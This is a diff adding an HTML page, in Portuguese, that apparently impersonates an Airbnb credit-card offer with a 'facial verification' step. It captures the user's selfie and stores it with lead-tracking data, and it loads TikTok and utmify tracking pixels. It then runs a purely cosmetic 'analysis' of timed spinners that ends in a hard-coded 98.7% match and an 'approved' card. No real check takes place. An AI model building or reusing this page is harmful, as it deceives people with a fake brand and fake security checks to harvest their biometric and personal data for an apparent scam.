@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<script>
+  window.tikTokPixelId = "69edaaffbdf66cc14237f33f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script>
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];
+  ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"];
+  ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};
+  for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);
+  ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e};
+  ttq.load=function(e,n){
+    var r="https://analytics.tiktok.com/i18n/pixel/events.js";
+    ttq._i=ttq._i||{};ttq._i[e]=[];ttq._i[e]._u=r;
+    ttq._t=ttq._t||{};ttq._t[e]=+new Date;
+    ttq._o=ttq._o||{};ttq._o[e]=n||{};
+    n=document.createElement("script");n.type="text/javascript";n.async=!0;
+    n.src=r+"?sdkid="+e+"&lib="+t;
+    e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)
+  };
+  ttq.load("D7MEITBC77U9TECL9BF0");
+  ttq.page();
+}(window, document, "ttq");
+</script>
+<!-- TikTok Pixel Code End -->
+
+
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verificação de Identidade — Cartão Airbnb</title>
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{--red:#FF385C;--red-dark:#E00B41;--black:#1A1A1A;--success:#34C759;--font:'Sora',-apple-system,sans-serif}
+        body{font-family:var(--font);background:var(--black);color:#fff;-webkit-font-smoothing:antialiased;overflow:hidden;height:100vh;height:100dvh}
+        .page{max-width:520px;margin:0 auto;height:100vh;height:100dvh;display:flex;flex-direction:column;position:relative;overflow:hidden}
+
+        /* BG GLOW */
+        .bg-glow{position:absolute;width:260px;height:260px;border-radius:50%;filter:blur(80px);opacity:.12;pointer-events:none}
+        .bg-glow.r{background:var(--red);top:-5%;left:-10%;animation:fg 9s ease-in-out infinite}
+        .bg-glow.p{background:#E00B41;bottom:10%;right:-10%;animation:fg 9s ease-in-out infinite reverse}
+        @keyframes fg{0%,100%{transform:translate(0,0)}50%{transform:translate(25px,-25px)}}
+
+        /* Header */
+        .v-header{padding:16px 20px;display:flex;align-items:center;justify-content:space-between;position:relative;z-index:10}
+        .v-header .back{width:32px;height:32px;display:flex;align-items:center;justify-content:center;border:none;background:rgba(255,255,255,0.08);border-radius:50%;cursor:pointer}
+        .v-header .back svg{width:14px;height:14px;fill:#fff}
+        .v-header .title{font-size:0.8125rem;font-weight:600;color:rgba(255,255,255,0.7)}
+        .v-header .secure{display:flex;align-items:center;gap:4px;font-size:0.6875rem;color:var(--success);font-weight:600}
+        .v-header .secure svg{width:12px;height:12px;fill:var(--success)}
+
+        /* Camera Area */
+        .camera-section{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;position:relative;padding:0 20px}
+        .camera-frame{width:220px;height:275px;border-radius:110px;position:relative;overflow:hidden;border:3px solid rgba(255,255,255,0.12);transition:border-color 0.5s ease}
+        .camera-frame.scanning{border-color:var(--red);animation:scanPulse 2s ease infinite}
+        .camera-frame.verified{border-color:var(--success)}
+        .camera-frame video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
+        .camera-frame canvas{width:100%;height:100%;object-fit:cover;display:none;transform:scaleX(-1)}
+
+        .scan-line{position:absolute;top:0;left:5%;width:90%;height:2px;background:linear-gradient(90deg,transparent,var(--red),transparent);opacity:0;z-index:5}
+        .scan-line.active{opacity:1;animation:scanDown 2.5s ease-in-out infinite}
+
+        .face-guide{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:165px;height:215px;border:2px dashed rgba(255,255,255,0.2);border-radius:82px;z-index:5}
+        .face-guide-text{position:absolute;bottom:8px;width:100%;text-align:center;font-size:0.6rem;color:rgba(255,255,255,0.45);letter-spacing:0.05em}
+
+        .camera-icon{width:60px;height:60px;border-radius:50%;background:rgba(255,56,92,0.12);border:2px solid rgba(255,56,92,0.25);display:flex;align-items:center;justify-content:center;margin-bottom:10px}
+        .camera-icon svg{width:28px;height:28px;fill:var(--red)}
+
+        /* Instructions */
+        .v-instructions{text-align:center;padding:14px 20px;position:relative;z-index:10}
+        .v-instructions h2{font-size:1.1rem;font-weight:700;margin-bottom:6px}
+        .v-instructions p{font-size:0.8rem;color:rgba(255,255,255,0.55);line-height:1.5;max-width:300px;margin:0 auto}
+
+        /* Status */
+        .v-status{padding:10px 20px;text-align:center}
+        .v-status-row{display:flex;align-items:center;gap:8px;justify-content:center;font-size:0.8rem;color:rgba(255,255,255,0.45);margin-bottom:6px;transition:color 0.3s;font-weight:500}
+        .v-status-row.done{color:var(--success)}
+        .v-status-row.active{color:#fff}
+        .v-status-row svg{width:16px;height:16px}
+        .v-status-row .check{fill:var(--success)}
+        .v-status-row .spinner{width:16px;height:16px;border:2px solid rgba(255,255,255,0.1);border-top-color:var(--red);border-radius:50%;animation:spin 0.8s linear infinite}
+
+        /* Action */
+        .v-action{padding:10px 20px 24px;position:sticky;bottom:0;z-index:10;background:linear-gradient(to bottom,transparent,var(--black) 30%)}
+        .v-btn{width:100%;padding:15px;border:none;border-radius:14px;font-size:.95rem;font-weight:700;cursor:pointer;font-family:var(--font);transition:all 0.3s ease}
+        .v-btn.primary{background:linear-gradient(135deg,var(--red),var(--red-dark));color:#fff}
+        .v-btn.primary:hover{opacity:.9}
+        .v-btn.primary:active{transform:scale(0.98)}
+        .v-btn:disabled{opacity:0.4;cursor:not-allowed}
+        .v-btn.success{background:var(--success);color:#fff}
+        .v-skip{display:block;margin:8px auto 0;font-size:0.75rem;color:rgba(255,255,255,0.3);background:none;border:none;cursor:pointer;font-family:var(--font);text-decoration:underline}
+
+        /* Views */
+        .view{display:none;flex-direction:column;height:100%}
+        .view.active{display:flex}
+
+        /* Checklist items */
+        .check-list{display:flex;flex-direction:column;gap:7px;width:100%;max-width:300px;margin:0 auto 14px}
+        .check-item{display:flex;align-items:center;gap:12px;padding:8px 14px;background:rgba(255,255,255,0.04);border-radius:12px;border:1px solid rgba(255,255,255,0.06)}
+        .check-item svg{width:18px;height:18px;fill:var(--red);flex-shrink:0}
+        .check-item span{font-size:0.8rem;color:rgba(255,255,255,0.75);font-weight:500}
+
+        /* Success */
+        .success-check{width:76px;height:76px;border-radius:50%;background:linear-gradient(135deg,var(--success),#2DB84D);display:flex;align-items:center;justify-content:center;margin:0 auto 16px;animation:springIn 0.5s cubic-bezier(0.175,0.885,0.32,1.275)}
+        .success-check svg{width:38px;height:38px;fill:#fff}
+        .score-badge{margin-top:20px;padding:14px 22px;background:rgba(52,199,89,0.08);border:1px solid rgba(52,199,89,0.18);border-radius:14px;text-align:center;animation:fadeInUp 0.5s ease 0.5s both}
+        .score-badge .s-lbl{font-size:0.7rem;color:var(--success);margin-bottom:4px;font-weight:600;text-transform:uppercase;letter-spacing:.06em}
+        .score-badge .s-val{font-size:1.5rem;font-weight:800;color:var(--success)}
+        .score-badge .s-tag{font-size:0.68rem;color:rgba(255,255,255,0.35);margin-top:2px}
+
+        @keyframes scanPulse{0%,100%{box-shadow:0 0 0 0 rgba(255,56,92,0.25)}50%{box-shadow:0 0 0 12px rgba(255,56,92,0)}}
+        @keyframes scanDown{0%{top:0}50%{top:100%}100%{top:0}}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        @keyframes springIn{from{transform:scale(0)}to{transform:scale(1)}}
+        @keyframes fadeInUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+    </style>
+</head>
+<body>
+<div class="page">
+    <div class="bg-glow r"></div>
+    <div class="bg-glow p"></div>
+
+    <!-- VIEW 1: INTRO -->
+    <div class="view active" id="viewIntro">
+        <div class="v-header">
+            <button class="back" onclick="history.back()"><svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg></button>
+            <span class="title">Verificação de Identidade</span>
+            <span class="secure"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/></svg> Seguro</span>
+        </div>
+
+        <div style="flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:10px 20px 0">
+            <div class="camera-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 15.2A3.2 3.2 0 1 0 12 8.8a3.2 3.2 0 0 0 0 6.4z"/><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
+            </div>
+            <h2 style="font-size:1.25rem;font-weight:800;text-align:center;margin-bottom:8px">Verificação Facial</h2>
+            <p style="font-size:0.82rem;color:rgba(255,255,255,0.55);text-align:center;max-width:280px;line-height:1.5;margin-bottom:12px">Para garantir sua segurança, precisamos confirmar sua identidade com uma selfie rápida antes de liberar seu Cartão Airbnb.</p>
+
+            <div class="check-list">
+                <div class="check-item">
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                    <span>Procure boa iluminação</span>
+                </div>
+                <div class="check-item">
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                    <span>Centralize seu rosto no oval</span>
+                </div>
+                <div class="check-item">
+                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                    <span>Mantenha-se imóvel por 3 segundos</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="v-action">
+            <button class="v-btn primary" onclick="startCamera()">Iniciar verificação</button>
+            <button class="v-skip" onclick="skipVerification()">Verificar depois</button>
+        </div>
+    </div>
+
+    <!-- VIEW 2: CAMERA -->
+    <div class="view" id="viewCamera">
+        <div class="v-header">
+            <button class="back" onclick="goBackToIntro()"><svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg></button>
+            <span class="title">Posicione seu rosto</span>
+            <span class="secure"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/></svg> Seguro</span>
+        </div>
+
+        <div class="camera-section">
+            <div class="camera-frame" id="cameraFrame">
+                <video id="video" autoplay playsinline></video>
+                <canvas id="canvas"></canvas>
+                <div class="scan-line" id="scanLine"></div>
+                <div class="face-guide" id="faceGuide">
+                    <div class="face-guide-text">Posicione aqui</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="v-instructions" id="cameraInstructions">
+            <h2 id="camTitle">Posicione seu rosto</h2>
+            <p id="camText">Centralize dentro do oval e mantenha expressão neutra</p>
+        </div>
+
+        <div class="v-action">
+            <button class="v-btn primary" id="captureBtn" onclick="capturePhoto()" disabled>Capturar foto</button>
+        </div>
+    </div>
+
+    <!-- VIEW 3: PROCESSING -->
+    <div class="view" id="viewProcessing">
+        <div class="v-header">
+            <div style="width:32px"></div>
+            <span class="title">Analisando...</span>
+            <span class="secure"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/></svg> Seguro</span>
+        </div>
+
+        <div style="flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:10px 20px 0">
+            <div class="camera-frame verified" style="width:175px;height:220px;border-radius:87px;margin-bottom:22px">
+                <canvas id="reviewCanvas" style="display:block;width:100%;height:100%;object-fit:cover;transform:scaleX(-1)"></canvas>
+            </div>
+
+            <div class="v-status">
+                <div class="v-status-row active" id="step1">
+                    <div class="spinner"></div>
+                    <span>Detectando rosto...</span>
+                </div>
+                <div class="v-status-row" id="step2">
+                    <svg viewBox="0 0 24 24" fill="rgba(255,255,255,0.2)"><circle cx="12" cy="12" r="10"/></svg>
+                    <span>Verificando identidade...</span>
+                </div>
+                <div class="v-status-row" id="step3">
+                    <svg viewBox="0 0 24 24" fill="rgba(255,255,255,0.2)"><circle cx="12" cy="12" r="10"/></svg>
+                    <span>Validando segurança...</span>
+                </div>
+                <div class="v-status-row" id="step4">
+                    <svg viewBox="0 0 24 24" fill="rgba(255,255,255,0.2)"><circle cx="12" cy="12" r="10"/></svg>
+                    <span>Finalizando análise...</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- VIEW 4: SUCCESS -->
+    <div class="view" id="viewSuccess">
+        <div class="v-header">
+            <div style="width:32px"></div>
+            <span class="title">Verificação Concluída</span>
+            <span class="secure"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/></svg> Seguro</span>
+        </div>
+
+        <div style="flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:10px 20px 0">
+            <div class="success-check">
+                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+            </div>
+            <h2 style="font-size:1.3rem;font-weight:800;text-align:center;margin-bottom:8px;animation:fadeInUp 0.5s ease 0.2s both">Identidade Verificada</h2>
+            <p style="font-size:0.82rem;color:rgba(255,255,255,0.55);text-align:center;max-width:280px;line-height:1.5;animation:fadeInUp 0.5s ease 0.35s both">Sua verificação facial foi concluída com sucesso. Seu Cartão Airbnb está aprovado!</p>
+
+            <div class="score-badge">
+                <div class="s-lbl">Score de Verificação</div>
+                <div class="s-val">98.7%</div>
+                <div class="s-tag">Aprovado • Face Match</div>
+            </div>
+        </div>
+
+        <div class="v-action">
+            <button class="v-btn success" onclick="goToApproval()">Ver meu Cartão Airbnb aprovado</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function(){var u=['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];var p=new URLSearchParams(window.location.search);u.forEach(function(k){var v=p.get(k);if(v)localStorage.setItem(k,v);});})();
+    const LeadData={_k:'airbnb_lead',load(){try{return JSON.parse(localStorage.getItem(this._k)||'{}')}catch{return{}}},update(d){const c=this.load();const u={...c,...d,updated_at:Date.now()};localStorage.setItem(this._k,JSON.stringify(u));return u}};
+    function buildUrl(b,e={}){const u=new URL(b,window.location.href);new URLSearchParams(window.location.search).forEach((v,k)=>u.searchParams.set(k,v));Object.entries(e).forEach(([k,v])=>{if(v)u.searchParams.set(k,v)});return u.toString()}
+
+    LeadData.update({page:'verificacao'});
+
+    const p=new URLSearchParams(window.location.search);
+    if(p.get('skip')==='1'){
+        LeadData.update({verificacao_facial:false,verificacao_skipped:true});
+        const d=LeadData.load();
+        window.location.href=buildUrl('aprovado.html',{nome:d.nome||'',limite:(d.limite||'').toString()});
+    }
+
+    let stream=null;
+    const video=document.getElementById('video');
+    const canvas=document.getElementById('canvas');
+    const reviewCanvas=document.getElementById('reviewCanvas');
+
+    function showView(id){
+        document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+    }
+
+    async function startCamera(){
+        showView('viewCamera');
+        try{
+            stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},audio:false});
+            video.srcObject=stream;
+            video.onloadedmetadata=()=>{
+                video.play();
+                setTimeout(()=>{
+                    document.getElementById('captureBtn').disabled=false;
+                    document.getElementById('camTitle').textContent='Rosto detectado';
+                    document.getElementById('camText').textContent='Clique em capturar quando estiver pronto';
+                    document.getElementById('cameraFrame').classList.add('scanning');
+                    document.getElementById('scanLine').classList.add('active');
+                    document.getElementById('faceGuide').querySelector('.face-guide-text').textContent='Rosto detectado ✓';
+                },1500);
+            };
+        }catch(e){
+            document.getElementById('cameraFrame').innerHTML=`
+                <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;padding:20px;text-align:center">
+                    <svg width="44" height="44" fill="rgba(255,255,255,0.25)" viewBox="0 0 24 24"><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9z"/></svg>
+                    <p style="font-size:.7rem;color:rgba(255,255,255,.4);margin-top:10px;line-height:1.4">Câmera não disponível<br>neste dispositivo</p>
+                </div>`;
+            document.getElementById('camTitle').textContent='Câmera indisponível';
+            document.getElementById('camText').textContent='Você pode continuar sem a verificação facial';
+            document.getElementById('captureBtn').textContent='Continuar sem verificação';
+            document.getElementById('captureBtn').disabled=false;
+            document.getElementById('captureBtn').onclick=function(){skipVerification();};
+        }
+    }
+
+    function capturePhoto(){
+        const frame=document.getElementById('cameraFrame');
+        frame.style.borderColor='#fff';
+        setTimeout(()=>frame.style.borderColor='var(--success)',200);
+
+        const ctx=canvas.getContext('2d');
+        canvas.width=video.videoWidth;
+        canvas.height=video.videoHeight;
+        ctx.drawImage(video,0,0);
+
+        const rCtx=reviewCanvas.getContext('2d');
+        reviewCanvas.width=video.videoWidth;
+        reviewCanvas.height=video.videoHeight;
+        rCtx.drawImage(video,0,0);
+
+        const tmpC=document.createElement('canvas');
+        tmpC.width=200;tmpC.height=250;
+        tmpC.getContext('2d').drawImage(video,0,0,200,250);
+        LeadData.update({selfie:tmpC.toDataURL('image/jpeg',0.5),selfie_timestamp:Date.now()});
+
+        if(stream)stream.getTracks().forEach(t=>t.stop());
+        setTimeout(()=>{showView('viewProcessing');runVerification();},500);
+    }
+
+    function runVerification(){
+        const steps=[{id:'step1',delay:1200},{id:'step2',delay:1800},{id:'step3',delay:1400},{id:'step4',delay:1100}];
+        const checkSVG='<svg viewBox="0 0 24 24" class="check"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>';
+        let current=0;
+        function nextStep(){
+            if(current>=steps.length){LeadData.update({verificacao_facial:true});setTimeout(()=>showView('viewSuccess'),600);return;}
+            const step=steps[current];
+            const el=document.getElementById(step.id);
+            el.className='v-status-row active';
+            el.querySelector('svg,.spinner')?.remove();
+            const sp=document.createElement('div');sp.className='spinner';
+            el.insertBefore(sp,el.firstChild);
+            setTimeout(()=>{
+                el.className='v-status-row done';
+                el.querySelector('.spinner')?.remove();
+                el.insertAdjacentHTML('afterbegin',checkSVG);
+                current++;nextStep();
+            },step.delay);
+        }
+        nextStep();
+    }
+
+    function goBackToIntro(){if(stream)stream.getTracks().forEach(t=>t.stop());showView('viewIntro');}
+
+    function skipVerification(){
+        if(stream)stream.getTracks().forEach(t=>t.stop());
+        LeadData.update({verificacao_facial:false,verificacao_skipped:true});
+        const d=LeadData.load();
+        window.location.href=buildUrl('aprovado.html',{nome:d.nome||'',limite:(d.limite||'').toString()});
+    }
+
+    function goToApproval(){
+        const d=LeadData.load();
+        window.location.href=buildUrl('aprovado.html',{nome:d.nome||'',limite:(d.limite||'').toString()});
+    }
+</script>
+</body>
+</html>
+
+
